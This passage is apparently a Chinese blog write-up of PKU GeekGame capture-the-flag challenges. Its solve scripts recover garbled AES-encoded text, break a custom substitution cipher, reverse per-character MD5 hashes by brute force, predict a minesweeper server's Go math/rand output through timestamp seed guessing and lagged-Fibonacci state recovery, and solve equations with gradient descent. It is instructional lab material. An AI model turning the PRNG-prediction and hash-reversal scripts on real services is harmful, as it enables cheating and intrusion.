%}\n将需要打码的文字输入在上面的文本框里，点击『听佛说宇宙的真谛』按钮，就能在下面得到打码后的文字。\n\n\n将需要解码的文字输入在下面的文本框里，记得带上『佛曰：』或『如是我闻：』的文字，点击『参悟佛所言的真意』按钮，就能在上面的文本框里得到解码后的文字。\n\n\n顺便说下，为什么有时候会出现『太深奥了，参悟不出佛经的真意……』的情况，那是因为某些深井冰的网站（百度说的就是你！），会将繁体字转换为简体字，这样你复制后的文字已经不是最初的原文了，所以解不出。本佛祖的代言人已经尽力的去尝试参悟了，可惜还是有部分被篡改的佛语无能为力，十分抱歉o(>﹏<)o\n\n\n——[与佛论禅](https://www.keyfc.net/bbs/tools/tudoucode.aspx)\n\n\n小 Z 身在日本，有人给小 Z 发了一大段佛语，但是小 Z 一打开，全是乱码。这该怎么办啊？\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/tudoucode/attachment/prob18.zip)\n{% endnote %}\n{% endhideToggle %}\n### flag1\n\n\n注意到flag1的生成方法：\n\n\n\n```python\nwith open(\"flag1\",\"r\",encoding=\"utf-8\") as f:\n    x=f.read()\nwith open(\"flag1.enc\",\"w\",encoding=\"utf-8\") as f:\n    f.write(Encrypt(x).encode(\"utf-8\").decode(\"shift_jis\",errors=\"ignore\"))\n```\n\n其中，Encrypt函数：\n\n\n\n```python\ndef Encrypt(plaintext):\n    # 1. Encode Plaintext in UTF-16 Little Endian\n    data = plaintext.encode('utf-16le')\n    # 2. Add Paddings (PKCS7)\n    pads = (- len(data)) % 16\n    data = data + bytes(pads * [pads])\n    # 3. Use AES-256-CBC to Encrypt\n    cryptor = AES.new(KEY, AES.MODE_CBC, IV)\n    result = cryptor.encrypt(data)\n    # 4. Encode and Add Header\n    return '佛曰：' + ''.join([TUDOU[i] if i < 128 else choice(BYTEMARK) + TUDOU[i - 128] for i in result])\n```\n\n将文本先进行AES加密，然后转换成“佛语编码”，也即一些汉字。\n\n\n再回到生成flag1.enc的代码：\n\n\n\n```python\nEncrypt(x).encode(\"utf-8\").decode(\"shift_jis\",errors=\"ignore\")\n```\n\n先将佛语进行utf-8编码，再进行shift_jis解码，了解到后者是日语里的一种常用编码格式。并且utf-8是将汉字编码为3个字节，shift_jis则是将日文字符编码为1-2个字节，而通过utf-8编码得到的内容按1-2字节进行分组，则未必在shift_jis的字符集里，直接用shift_jis解码有概率会导致报错，而errors=\"ignore\"行为表示如果遇到无法解码的字节，则直接忽略。因此这一编码-解码行为是有一定的损失的。但好在损失不会影响字节之间的顺序，因此在原文长度较短的情况下，可以通过暴力搜索逐字对原文进行还原。而flag1满足\"原文长度较短\"这个条件，我觉得可以一试。\n\n\n我使用了回溯法来解这个问题，判断条件是字符串在经过编码-解码出来的东西是否是文件的开始几个字符。别说，虽然没用到任何编码解码的原理，但还真好用。以下是解flag1的代码：\n\n\n\n```python\nfrom prob import *\n\nwith open(\"flag1.enc\", \"r\", encoding='utf-8') as f:\n    cip = f.read()\n\nres = []\nstate = '佛曰：'\n\n\ndef check(s):\n    return cip.startswith(s.encode('utf-8').decode('shift_jis', 'ignore'))\n\n\ndef back(state):\n    if state.encode('utf-8').decode('shift_jis', 'ignore') == cip:\n        res.append(state)\n        return\n    if state[-1] in BYTEMARK:\n        charset = TUDOU\n    else:\n        charset = TUDOU + BYTEMARK\n    for c in charset:\n        if check(state + c):\n            back(state + c)\n\n\nback(state)\nfor r in res:\n    try:\n        print(Decrypt(r))\n    except:\n        pass\n```\n\nflag{s1mp1e_Tud0uc0d3}\n\n\n\n但这个方法对flag2就不管用了，因此我没做flag2。\n\n\n## 奇怪的加密\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n小 Z 学习了简易替换密码、维吉尼亚密码等多种古典密码，然后自己设计了一种古典密码。\n\n\n小 Z 认为，这种密码没人能破解。\n\n\n是这样的吗？\n\n\nFlag 2 提示：\n\n\n1.此部分和 Flag 1 没有关联，也即不需要先解出 Flag 1\n\n\n2.搜索引擎会给你一些帮助，虽然不是必需的\n\n\n3.如果你还原的原文正确，把原文的内容放到搜索引擎里面搜索，会告诉你下一步做什么\n\n\n本题 Flag 格式符合此正则表达式：flag\\{[a-z0-9_]+\\}\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/strangeencrypt/attachment/prob17.zip)\n{% endnote %}\n{% endhideToggle %}\n首先根据题给代码可以了解到该加密算法的原理，这种加密算法是经典的简单替换密码的一种修改与推广，区别在于对文本的第n个英文字母，要连续迭代进行(n-1)次简单替换。假设映射$f(c)$表示一个简单替换密码映射，若将以$f$作为密钥的本题算法用$g(c, n)$表示（其中参数$n$表示英文字母变量$c$在文本所有英文字母中的位次），则有\n\n\n$$g(c, n) = f^{(n-1)}(c)$$\n\n\n$f$的上标表示将$f$进行复合运算的次数。例如若规定某种简单替换密码的替换规则为a=>b，b=>f...，则对于文本第3个字母，需要进行2次迭代替换，若其恰好是a，则先将a替换为b，再将b替换为f。\n\n\n### flag1\n\n\n题目给了两个crypt文件，先来看crypt1.txt（下面贴出了文本的前面一部分内容）：\n\n\n\n```raw\nCinqwmzewtxs kn f kiepagkuf umpd op hsoert trsjbo lxmlurzyrzmke enpariq dtseeimrw areslyy, kp chlqwzwgme dnwg eosk ofapera xrne zo gynw mxyx exhbt aft fhir qox re wzroqyqpg per dpak ahcq re wtk pflmcmew zlq boqd ig. Kktsxzhcf pngghr hr yks oixwzwry, usogltqrd oxxohgf. Qohtkesakm kn aflh nx lgeyrld gqzhm fon pqmkioitfagxei sc ncbggnpg - kmbw to papcld cxnfogmkyp. Kmw bovsrem qombqqh, fzxqpq sbeczgtfzi twd zumecmc hk yqai bqe zwoxsxib ttzklcrnh nx lhlpmd dcbextfcal. Cfi dnzssrfgi kcorcda ee heasl to msrmsxk xgqqa fpsltityzkbrotf noc bibnyd wqxfiyw, szhnxyoqc bextfzmewlrbw to nhf kxfykkq kb mcfhch hr htsaq brd keod ytzqn hc qlxxz picylop.\n...\n```\n\n上面文本显然是由一段英文经过前面的算法加密得来的，本题的目的应该是解出原文，这里我的解法比较非预期，~~充分利用了对英语词汇、句法的敏感度。~~\n\n\n由于第一个字母并没有经过变换，因此原文第一个单词以C为开头，而这个单词的长度显然是12，结合这题的背景，我立马在脑海里反应出\"Cryptography\"（密码学）这个单词，而原文第二、第三个单词显然是\"is a\"，那么这第一句话应该是在介绍密码学是一种什么什么东西。后面一个密文单词\"kiepagkuf\"，长度为9，我想了半天，觉得\"technique\"比较符合句意。那么到这里为止主谓宾都已经有了，后面一长串应该是用来修饰\"technique\"的从句，继续往下看：\"umpd op\"一眼\"used to\"，并且句意“密码学是一种用来xxx的技术”好像非常靠谱。后面我实在是想不出来了，但我估计这原文很有可能是来自于网络，于是搜索了一下：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/b5330cdabe0a2402c756c1dca1c1650c.png)\n数了一下后面几个单词的长度，草（\n\n\n太爽了， 直接搞定明文。\n\n\n那么密钥也手到擒来，这题用到的密钥为ynkdfmrawuqpltzchiegjvxobs，可以写一个函数逆一下这个密钥：\n\n\n\n```python\ndef reverse_key(key):\n    return ''.join(chr(97 + key.index(c)) for c in 'abcdefghijklmnopqrstuvwxyz')\n```\n\n得到逆变换的密钥，然后用这个密钥加密一下crypt1.txt文件即可。\n\n\n拿到整个文件的明文后，发现flag：\n\n\n\n```raw\nThe flag is foxtrot lima alpha golf left bracket foxtrot romeo echo nine uniform echo november charlie yankee underscore four november alpha lima yankee five india sierra underscore one sierra underscore uniform sierra echo foxtrot uniform lima right bracket.\n```\n\n想起以前hackergame有过类似的东西，好像是什么[无线电北约音标字母](https://zh.wikipedia.org/wiki/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D)，一个一个对着翻译过来即可拿到flag。\n\n\nflag{fre9uency_4naly5is_1s_useful}\n\n\n\n当然这题的正常做法肯定是找文中出现的单字母单词（其明文一定都是a），然后再进行逐步推导。\n\n\n### flag2\n\n\n再看crypt2.txt，如下是部分内容：\n\n\n\n```raw\nb9pyi18f950iuevk6i0gnnxc4km731q3\n2510n39011k5hz704182423u3z695v91\ne1671797h52g15d763380u45x841nd32\n7215ms9u7x9ne229m2921c40w899fx5t\n69691k7hwto3qe6j5z8p1361j22v04rd\nv623s75mg30q62nks73t6os5q50ch7y5\nu4lu3b7ljzfx2345e7772e0674n318i5\n...\n```\n\n这个文件有好多行，而每一行长度都是32，且包含数字和字母，这与MD5消息摘要非常相似。正常来说，MD5虽然可以碰撞，但一般需要彩虹表以及较多时间，因此我放了很久才做这题。\n\n\n后来，同样是因为无题可做了，我才回过来看这题，简单打了一个表试了一下。注意到数字不受算法影响，因此只要在碰撞时忽略掉所有字母，只关注数字即可，我的操作是直接把字母替换成了减号。\n\n\n\n```python\nimport re\nimport hashlib\nimport string\nfrom itertools import product\n\n\nwith open(\"crypt2.txt\", \"r\") as f:\n    data = list(re.sub('[a-z]', '-', f.read()).split('\\n')[:-1])\n\n\ndef myhash(s):\n    md5 = hashlib.md5(s.encode()).hexdigest()\n    return re.sub('[a-z]', '-', md5)\n\n\nhash_dict = {}\nfor k in range(1, 4):\n    for s in product(string.ascii_lowercase + string.ascii_uppercase, repeat=k):\n        s = ''.join(s)\n        hash_dict[myhash(s)] = s\nfor i in range(len(data)):\n    print(hash_dict.get(data[i]))\n```\n\n最开始，我只用了26个英文大小写字母的排列组合来进行遍历碰撞，长度范围取了1~3，谁知不试不知道，一试才发现这好多条MD5对应的消息都非常短。因此我把字符集扩充了一下，增加了一些诸如空格、连字符、句号、逗号等容易出现在英文段落里的字符，（当然还有容易出现在flag里的花括号、下划线）。如此一来，这题甚至不需要解出密钥就可以直接拿到flag2。解题代码如下：\n\n\n\n```python\nimport re\nimport hashlib\nimport string\nfrom itertools import product\n\n\nwith open(\"crypt2.txt\", \"r\") as f:\n    data = list(re.sub('[a-z]', '-', f.read()).split('\\n')[:-1])\n\n\ndef myhash(s):\n    md5 = hashlib.md5(s.encode()).hexdigest()\n    return re.sub('[a-z]', '-', md5)\n\n\nhash_dict = {}\nfor k in range(1, 4):\n    for s in product(string.ascii_lowercase + string.ascii_uppercase + string.digits + ' -_.,{}', repeat=k):\n        s = ''.join(s)\n        hash_dict[myhash(s)] = s\nflag_text = [\"\" for _ in data]\nfor i in range(len(data)):\n    flag_text[i] = hash_dict.get(data[i], '')\nprint(''.join(flag_text))\n```\n\nflag{md5_1s_re41ly_1n5ecur3}\n\n\n\n## 扫雷 II\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n对于上一届 PKU GeekGame 的 “扫雷” 题目，有选手说：\n\n\n“建议主办方下次出扫雷这种题的时候可以真的搞一个扫雷的 UI  \n\n这样更好玩  \n\n虽然终端也能实现相同的逻辑，但是趣味性就差很多了”\n\n\n——zzh1996\n\n\n因此我们今年就做了一个更好玩的扫雷游戏。\n\n\n提示：理解去年的 “扫雷” 题目的解法对解出本题会有帮助。\n\n\n\n[本题附件](https://raw.githubusercontent.com/PKU-GeekGame/geekgame-2nd/master/official_writeup/sweeper2/attachment/prob14.go)\n{% endnote %}\n{% endhideToggle %}\n在以前的比赛中，曾多次出现过这种攻击随机数算法的题，但我从来没认真思考过，这次觉得总该有所突破了，遂尝试了一下，最后在第一阶段快结束时解出了前两个flag，在第二阶段刚开始时解出了第三个flag，本菜鸟感到非常满意。\n\n\n拿到本题后端源码，我一看，是用Go语言写的，我不会Go，裂开，于是放了几天才回过头去看这个题。\n\n\n这题的核心是对Go的伪随机算法的攻击，经粗略学习，我了解到Go共有两个随机数包，\"math/rand\"和\"crypto/rand\"，前者是一个伪随机算法，而后者则是通过读取硬件信息来生成随机数，这个随机数相对而言比较真一点。\n\n\n阅读源码可知，在程序运行起来时，程序会设置\"math/rand\"的种子为当前的Unix毫秒时间戳，并且每次发起/reset请求时，都会重设种子为当前的Unix毫秒时间戳。接下来，分别入手三个地图生成函数。\n\n\n### flag1\n\n\n\n```go\nfunc genBoard1() (board Board) {\n\tfor i := 0; i < 16; i++ {\n\t\tfor j := 0; j < 16; j++ {\n\t\t\tboard[i] ^= ((rand.Intn(257)) % 2) << j\n\t\t}\n\t}\n\treturn\n}\n```\n\n这里果然调用的是\"math/rand\"的伪随机函数，但由于取模运算丢掉了随机数的大部分信息，对于flag1我们没办法像之前的扫雷题那样通过收集足够多的连续bit来还原随机数状态。\n\n\n注意到我们可以通过调用/reset来为这个地图生成函数设定初始种子，并且这个种子是时间戳，我们可以通过记录发包前后的时间戳来确定一个大致的范围。那岂不是说明这题可以靠运气去撞随机种子，如果撞上就直接解出来了。\n\n\n但我实在不想在这个时候从头学一门新语言，因此我翻到了\"math/rand\"的[源码](https://github.com/golang/go/tree/master/src/math/rand)，对着源码用Python撸了一下这个算法（rng.go与rand.go）的一部分以及这题后端源码里用到的几个函数，例如地图生成函数等（太占篇幅，就不贴出来了）\n\n\n接下来我记录了一下发包前后的时间戳，决定撞一下随机种子：\n\n```python\nt1 = time.time_ns() // 1000000\nreset()\nt2 = time.time_ns() // 1000000\n```\n\n最开始我想着用大数定律去碰运气，因为t1与t2之间总共也就不到400个值，用脚本玩几百局就有较大期望能碰出来。\n\n\n结果碰了半个小时还没有结果。。。\n\n\n然后我不信邪，我觉得应该是运气太差了，于是记录下第一次遇到的地图，然后把随机取种子改成了遍历t1到t2，遍历到某个时间戳时，如果生成的地图能对应上前面记录的第一个地图，那么下一张本地生成的地图就能与下一张服务器端的地图对应上。\n\n```python\nt1 = time.time_ns() // 1000000\nreset()\nt2 = time.time_ns() // 1000000\n\ninit(1)\nfirst_board = None\nfor index in range(256):\n    i, j = index // 16, index % 16\n    res = click(i, j)\n    if 'boom' in res:\n        first_board = res['boom']\n        break\nprint('start searching')\nfor t in tqdm.tqdm(range(t1, t2)):\n    rand.Seed(t)\n    board = genBoard1()\n    info = showBoard(board)\n    if info == first_board:\n        print('match!')\n        break\nelse:\n    print('try again!')\n    exit(0)\n```\n\n然而，遍历完都没遇到相同的地图。\n\n\n于是我开始魔改时间戳的范围。虽然不明白为什么服务器那边用Golang获取到的时间戳会比我在本地用Python获取到的略小几百，但事实就是这样，当我把代码改成：\n\n```python\nt1 = time.time_ns() // 1000000 - 500\nreset()\nt2 = time.time_ns() // 1000000 - 500\n```\n\n时，首次出现了奇迹。成功打印出了\"match!\"。\n\n\n不过这个偏移量似乎和网络质量以及服务器的响应速度有关系，有时候改成-100即可，有时候则会在-800的位置撞上，有时候甚至是正数，总之非常不稳定，需要多次修改测试，干脆直接把搜索范围修改到发包前时间戳的±2000之间，成功率就会大大提升。主要解题代码：（utils.py包含了一些其他有用的函数）\n\n```python\nimport tqdm\n\nfrom utils import *\n\n\nt = time.time_ns() // 1000000\nreset()\ninit(1)\nfirst_board = None\nfor index in range(256):\n    i, j = index // 16, index % 16\n    res = click(i, j)\n    if 'boom' in res:\n        first_board = res['boom']\n        break\nprint('start searching')\nfor seed in tqdm.tqdm(range(t - 2000, t + 2000)):\n    rand.Seed(seed)\n    board = genBoard1()\n    info = showBoard(board)\n    if info == first_board:\n        print('match!')\n        break\nelse:\n    print('try again!')\n    exit(0)\nboard = genBoard1()\ninfo = showBoard(board)\nfor i in range(16):\n    for j in range(16):\n        if info[i][j] != -1:\n            print('click: ', i, j)\n            res = click(i, j)\n            if 'flag' in res:\n                print(res['flag'])\n                exit(0)\n```\n\nflag{Gue55_r4nd_sEEd}\n\n### flag2\n\n\n首先看level=2的情况：\n\n```go\nelse if lv == \"2\" {\n    level = 2\n    secureVal := make([]byte, 1)\n    securerand.Read(secureVal)\n    rn := int(rand.Uint64()%20221119) + int(secureVal[0])\n    for i := 0; i < rn; i += 1 {\n        rand.Uint64()\n    }\n    genBoard = genBoard2\n    curBoard = genBoard()\n    c.JSON(http.StatusOK, gin.H{\n        \"ok\": \"OK\",\n    })\n}\n```\n\n这里如果用前面的思路去碰撞时间戳，就不太靠谱了，因为这里我们不知道它调用了多少次rand.Uint64。\n\n\n阅读genBoard2函数：\n\n\n\n```go\nfunc genBoard2() (board Board) {\n\tfor i := 0; i < 4; i++ {\n\t\tdataBits := rand.Uint64()\n\t\tfor j := 0; j < 4; j++ {\n\t\t\tboard[4*i+j] = int(dataBits>>(16*j)) & 0xffff\n\t\t}\n\t}\n\treturn\n}\n```\n\n不错，这里产生的伪随机数一个bit都没浪费，那么应该可以利用与“收集一定数量的连续随机bit来确定随机数状态”类似的方法，进而对后面的随机数进行预测。\n\n\n其实在前面用Python复现Go的伪随机算法时我就已经了解到了\"math/rand\"算法的原理，其是基于[Lagged Fibonacci generator](https://en.wikipedia.org/wiki/Lagged_Fibonacci_generator)来进行实现的。这种伪随机算法的性质类似于斐波那契数列的性质，只是递推式的下标具有两个比较大的滞后。由Go伪随机数的[核心代码](https://github.com/golang/go/blob/master/src/math/rand/rng.go#L238)，容易推得\"math/rand\"中的Uint64()函数生成的序列具有以下递推关系：\n\n\n$$X_n=(X_{n-273}+X_{n-607}) \\ mod \\ 2^{64},\\ n \\ge 607$$\n\n\n其中模$2^{64}$是为了保持结果在uint64范围内。\n\n\n基于此，只要我们收集到连续的607个由函数Uint64生成的64位无符号整数，就可以通过上面的递推式预测后面的序列。\n\n\n注意到genBoard2()调用了四次Uint64，收集一个地图的数据即可拿到4个uint64整数，我们只要连续在152局游戏中踩雷，就可以拿到足够多的（608个）数据。\n\n\n当然这里需要写一下将showBoard返回的内容转化为地图信息的函数，以及将地图信息转化为四个uint64整数的函数，如下：\n\n\n\n```python\ndef rev_showBoard(info):\n    for i in range(16):\n        n = 0\n        for j in range(16):\n            if info[i][j] == -1:\n                n |= 1 << j\n        yield n\n\n\ndef board2databits(board):\n    for i in range(4):\n        dataBits = 0\n        for j in range(4):\n            dataBits += board[4 * i + j] << (16 * j)\n        yield rand.uint64(dataBits)\n```\n\n有了以上分析，可以写出主要的解题代码如下：\n\n\n\n```python\nimport tqdm\n\nfrom utils import *\n\n\nreset()\ninit(2)\nrandom_states = []\nfor n in tqdm.tqdm(range(152)):\n    for index in range(256):\n        i, j = index // 16, index % 16\n        res = click(i, j)\n        if 'boom' in res:\n            b = list(rev_showBoard(res['boom']))\n            random_states.extend(board2databits(b))\n            game_over = True\n            break\n        elif 'flag' in res:  # 万一不小心赢了呢?\n            print(res['flag'])\n            exit(0)\n\nnext_dataBits_list = [rand.uint(random_states[n - 273] + random_states[n - 607]) for n in range(608, 612)]\nb = genBoard2(next_dataBits_list)\ninfo = showBoard(b)\nfor index in range(256):\n    i, j = index // 16, index % 16\n    if info[i][j] != -1:\n        print(f'click: {i},{j}')\n        res = click(i, j)\n        if 'flag' in res:\n            print(res['flag'])\n            exit(0)\n```\n\n与有小概率失败的flag1脚本不同，运行此脚本可以100%拿到flag2。\n\n\nflag{Go_rand0m_number_is_ea5y_to_Guess}\n\n### flag3\n\n\n区区扫雷，这不是有手就行？~~只要扫雷技术过硬，直接用手玩即可拿到flag3。~~\n\n![IZUB5_FT@5DL6S416](https://oss.fyz666.xyz/blogfiles/png/2a5f24cab845fdbef8f14849fad36544.png)\n\n![](https://oss.fyz666.xyz/blogfiles/png/9c2cf8f3f063a15bcc54db5ab18251f4.png)\n这题是我在第二阶段解出来的。首先阅读genBoard3函数。\n\n```go\nfunc genBoard3() (board Board) {\n\tfor i := 1; i < 15; i++ {\n\t\tsecureVal := make([]byte, 2)\n\t\tsecurerand.Read(secureVal)\n\t\tif i%2 == 0 {\n\t\t\tboard[i] = (int(secureVal[0])*256 + int(secureVal[1])) & 0x5554\n\t\t} else {\n\t\t\tboard[i] = (int(secureVal[0])*256 + int(secureVal[1])) & 0x2aaa\n\t\t}\n\t}\n\tfor i := 0; i < 16; i++ {\n\t\tfor j := 0; j < 16; j++ {\n\t\t\tboard[i] ^= ((rand.Intn(257)) % 2) << j\n\t\t}\n\t}\n\treturn\n}\n```\n\n后半部分与genBoard1相同，前半部分为地图的1~14行进行了一个初始化，使用的是\"crypto/rand\"，没办法预测。但好在它为我们留了0行与15行，并且中间的每一行，都有一半左右必定为0的初始值。\n\n```python\n>>> bin(0x5554)\n'0b101010101010100'\n>>> bin(0x2aaa)\n'0b10101010101010'\n```\n\n由上可见，对于2、4、6、8、10、12、14行，其第0、1、3、5、7、9、11、13、15个块是一定会初始化为0的；对于1、3、5、7、9、11、13行，其第0、2、4、6、8、10、12、14、15个块同样一定会初始化为0，这些位置的块不受到\"crypto/rand\"随机数的影响。\n\n\n这样我们将flag1的解题代码略改一下，就可以拿来用了：\n\n```python\nimport tqdm\n\nfrom utils import *\n\n\nt = time.time_ns() // 1000000\nreset()\ninit(3)\nfirst_board = None\nfor index in range(256):\n    i, j = index // 16, index % 16\n    res = click(i, j)\n    if 'boom' in res:\n        first_board = list(rev_showBoard(res['boom']))\n        break\nprint('start searching')\nfor seed in tqdm.tqdm(range(t - 2000, t + 2000)):\n    rand.Seed(seed)\n    board = genBoard3()\n    if board[0] == first_board[0] and board[-1] == first_board[-1]:\n        print('match!')\n        break\nelse:\n    print('try again!')\n    exit(0)\nboard_records = [[-2 for _ in range(16)] for _ in range(16)]\nboard = genBoard3()\ninfo = showBoard(board)\nfor i in range(16):\n    if i in {2, 4, 6, 8, 10, 12, 14}:\n        j_list = [0, 1, 3, 5, 7, 9, 11, 13, 15]\n    elif i in {1, 3, 5, 7, 9, 11, 13}:\n        j_list = [0, 2, 4, 6, 8, 10, 12, 14, 15]\n    else:\n        j_list = range(16)\n    for j in j_list:\n        if info[i][j] != -1:\n            print('click: ', i, j)\n            res = click(i, j)\n            board_records[i][j] = res['ok']\n        else:\n            board_records[i][j] = -1\nprint('Go!')\n```\n\n与flag1的区别是，这里我们没办法全部点完，仍有一半左右的块是未知的，但信息量已经完全够了，在知道了一半块的状态后，这题确实可以直接用手玩。\n\n\n不过我还是写了个脚本来解，在拿到board_records后，扫雷的代码如下：\n\n```python\ndelta = [(1, 0), (-1, 0), (0, 1), (0, -1), (1, 1), (1, -1), (-1, 1), (-1, -1)]\nneighbor_unknown_grids = []  # 记录未扫出的邻近块坐标\nwhile 1:\n    is_changed = False\n    for index in range(256):\n        i, j = index // 16, index % 16\n        z = board_records[i][j]\n        if z == 0:  # 周围没有雷则把未知块点完\n            for delta_x, delta_y in delta:\n                if (i + delta_x) < 0 or (i + delta_x) >= 16 or (j + delta_y) < 0 or (j + delta_y) >= 16:\n                    continue\n                if board_records[i + delta_x][j + delta_y] == -2:\n                    is_changed = True\n                    res = click(i + delta_x, j + delta_y)\n                    board_records[i + delta_x][j + delta_y] = res['ok']\n                    print(\"click: \", i + delta_x, j + delta_y)\n                    if 'flag' in res:\n                        print(res['flag'])\n                        exit(0)\n        elif z > 0:  # 周围有z个雷\n            neighbor_unknown_grids.clear()\n            for delta_x, delta_y in delta:\n                if (i + delta_x) < 0 or (i + delta_x) >= 16 or (j + delta_y) < 0 or (j + delta_y) >= 16:\n                    continue\n                grid = board_records[i + delta_x][j + delta_y]\n                if grid == -2:  # 未知块\n                    neighbor_unknown_grids.append((i + delta_x, j + delta_y))\n                elif grid == -1:  # 该块已标记为雷\n                    z -= 1\n            if z == 0:  # 周围雷全部已知则把未知块点完\n                if neighbor_unknown_grids:\n                    is_changed = True\n                for x, y in neighbor_unknown_grids:\n                    res = click(x, y)\n                    board_records[x][y] = res['ok']\n                    print(\"click: \", x, y)\n                    if 'flag' in res:\n                        print(res['flag'])\n                        exit(0)\n            elif len(neighbor_unknown_grids) == z:  # 周围雷数量等于未知块数量则全部标记为雷\n                if neighbor_unknown_grids:\n                    is_changed = True\n                for x, y in neighbor_unknown_grids:\n                    print(\"mark: \", x, y)\n                    board_records[x][y] = -1\n    if not is_changed:  # 盘面没有变化，开始瞎点\n        for index in range(256):\n            i, j = index // 16, index % 16\n            if board_records[i][j] == -2:\n                print('click: ', i, j)\n                res = click(i, j)\n                if 'boom' in res:\n                    print(\"try again!\")\n                    exit(0)\n                elif 'flag' in res:\n                    print(res['flag'])\n                    exit(0)\n                else:\n                    board_records[i][j] = res['ok']\n                    break\n```\n\n该脚本的成功率比flag1的解题脚本略低一点，因为会有较低的概率在最后扫雷算法里遇到无法确定的块的情况，然后瞎点踩雷（写的不够智能，够用就行）。\n\n\nflag{What_a_m1nesweeper_AI}\n\n\n\n[全部解题代码](https://gist.github.com/windshadow233/95f0da79bb4723bcc9951ce671569905)\n\n\n## 方程组\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n小 Z 编了一道数学练习题，解一个线性方程组。根据《高等代数》课上老师说的，如果方程数量小于变量数量，那么方程有无穷多个解。但是……\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-2nd/raw/master/official_writeup/equation/attachment/prob11.zip)\n{% endnote %}\n{% endhideToggle %}\n\n一顿分析，发现是三个线性方程组，不过是求在一定精度下的解。\n\n\n感觉普通的解方程算法肯定就行不通了（后来发现第一问是可以的，大意了），但梯度下降法应该还是能用的。\n\n\n### flag1\n\n\n废话不多说直接上代码，这里我用的是PyTorch：\n\n\n\n```python\nimport torch\nfrom torch.nn import MSELoss\nfrom torch.optim import Adam\n\nprimes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107,\n          109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229,\n          233, 239, 241, 251, 257, 263, 269, 271]\nsqrt_primes = list(map(lambda x: x ** 0.5, primes))\nresults = ['16404', '16416', '16512', '16515', '16557', '16791', '16844', '16394', '15927', '15942', '15896', '15433',\n           '15469', '15553', '15547', '15507', '15615', '15548', '15557', '15677', '15802', '15770', '15914', '15957',\n           '16049', '16163']\nresults = list(map(float, results))\n\nflag_len = len(results)\np = sqrt_primes[:flag_len]\nmat = []\nfor i in range(flag_len):\n    mat.append(p)\n    p = [p[-1]] + p[:-1]\nmat = torch.tensor(mat, dtype=torch.float32)\nflag = torch.randint(0, 128, (flag_len,), dtype=torch.float32)\nflag = torch.nn.Parameter(flag)\nresults = torch.tensor(results, dtype=torch.float32)\noptim = Adam([flag], lr=5)\nloss_fcn = MSELoss()\nfor i in range(3000):\n    loss = loss_fcn(mat @ flag, results)\n    print(loss.item())\n    optim.zero_grad()\n    loss.backward()\n    optim.step()\n    print(''.join(chr(i) for i in torch.round(flag.clip(0, 127)).int()))\n```\n\n粗略调了调参，发现Adam学习率为5的时候收敛就比较稳且快了。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/2ab25f933cbc31c2a9fecc4be3ecae07.png)\n### flag2\n\n\n对于flag2，方程数量少了10个，精度则提升到了15，但好在PyTorch还是可以应付，我分了多次进行训练，首次训练固定了开始的五个字符\"flag{\"与最后的一个字符\"}\"，flag中间的数字初始化范围设定为97~122（a~z），这是为了让初始值不至于离目标太远。首次训练，设置Adam优化器学习率为1，迭代50000次，多次调参尝试，结果如下：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/b771326ed66bc010d47f84a154309068.png)\n发现了一些英文特征明显的字符串，推测goof这个位置的词应该是good，因此把\"y0u_are_a_good\"固定下来，进行第二轮训练，第二轮训练时，学习率保持不变，迭代次数减少到10000次，结果如下：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/17046ed31526da83e4a21932414d7981.png)\n成功跑出flag2。\n\n\n第一次训练代码：\n\n\n\n```python\nimport torch\nfrom torch.nn import MSELoss\nfrom torch.optim import Adam\n\nprimes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107,\n          109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229,\n          233, 239, 241, 251, 257, 263, 269, 271]\nsqrt_primes = list(map(lambda x: x ** 0.5, primes))\ntorch.set_printoptions(precision=15)\nresults = ['19106.6119577929', '19098.1846041713', '19124.6925013201', '19072.8591005901', '19063.3797914261', '19254.8741381550', '19410.9493230296', '18896.7331405884', '19021.3167024024', '18924.6509997019', '18853.3351082021', '18957.2296714145', '18926.7035797566', '18831.7182995672', '18768.8192204100', '18668.7452791590', '18645.9207293335', '18711.1447224940']\nresults = list(map(float, results))\n\nflag_len = len(results) + 10\np = sqrt_primes[:flag_len]\nmat = []\nfor i in range(flag_len):\n    mat.append(p)\n    p = [p[-1]] + p[:-1]\nmat = torch.tensor(mat, dtype=torch.float32)\nresults = torch.tensor(results, dtype=torch.float32)\nloss_fcn = MSELoss()\nprefix = torch.tensor([ord(c) for c in \"flag{\"], dtype=torch.float32)\nsuffix = torch.tensor([ord('}')], dtype=torch.float32)\nflag_unknown = torch.randint(97, 123, (flag_len - prefix.nelement() - suffix.nelement(),), dtype=torch.float32)\nflag_unknown = torch.nn.Parameter(flag_unknown)\noptim = Adam([flag_unknown], lr=1)\nfor i in range(50000):\n    flag = torch.cat([prefix, flag_unknown, suffix])\n    loss = loss_fcn((mat @ flag)[:-10], results)\n    print(loss.item())\n    optim.zero_grad()\n    loss.backward()\n    optim.step()\n    print(''.join(chr(i) for i in torch.round(torch.cat([prefix, flag_unknown, suffix]).clip(0, 127)).int()))\n```\n\n第二次训练代码：\n\n\n\n```python\nimport torch\nfrom torch.nn import MSELoss\nfrom torch.optim import Adam\n\nprimes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107,\n          109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229,\n          233, 239, 241, 251, 